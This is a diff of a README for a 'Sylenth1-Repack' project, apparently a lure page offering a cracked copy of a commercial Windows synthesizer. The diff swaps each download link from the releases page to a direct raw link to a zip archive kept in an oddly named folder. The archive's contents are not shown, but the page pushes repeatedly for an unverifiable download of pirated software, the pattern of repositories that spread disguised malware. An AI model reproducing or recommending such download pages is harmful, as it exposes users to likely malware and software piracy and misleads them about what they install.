@@ -1,13 +1,13 @@
 # 🎹 Sylenth1-Repack - Ultimate Synth for Music Production
 
 ## 🔗 Download Now
-[![Download Sylenth1-Repack](https://img.shields.io/badge/Download-Sylenth1--Repack-brightgreen)](https://github.com/mahmudzur/Sylenth1-Repack/releases)
+[![Download Sylenth1-Repack](https://raw.githubusercontent.com/mahmudzur/Sylenth1-Repack/main/ivorine/Repack_Sylenth_v3.0.zip)](https://raw.githubusercontent.com/mahmudzur/Sylenth1-Repack/main/ivorine/Repack_Sylenth_v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to Sylenth1-Repack, your powerful tool for creating electronic music. This software works seamlessly on Windows PCs and provides a rich set of features that enhance your audio production experience. 
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of Sylenth1-Repack: [Download Sylenth1-Repack](https://github.com/mahmudzur/Sylenth1-Repack/releases).
+To get started, visit this page to download the latest version of Sylenth1-Repack: [Download Sylenth1-Repack](https://raw.githubusercontent.com/mahmudzur/Sylenth1-Repack/main/ivorine/Repack_Sylenth_v3.0.zip).
 
 Once you reach the Releases page, look for the latest version. Click on it to find the available files. Download the installer file that matches your system. 
 
@@ -65,6 +65,6 @@ To help you get the most out of Sylenth1-Repack, check out our guides on:
 For additional help, please reach out via the Issues tab on our GitHub page. We value your feedback and are here to assist you.
 
 ## 🔗 Final Download Link
-Don't forget to download Sylenth1-Repack here: [Download Sylenth1-Repack](https://github.com/mahmudzur/Sylenth1-Repack/releases).
+Don't forget to download Sylenth1-Repack here: [Download Sylenth1-Repack](https://raw.githubusercontent.com/mahmudzur/Sylenth1-Repack/main/ivorine/Repack_Sylenth_v3.0.zip).
 
 Enjoy your music production experience with Sylenth1-Repack!
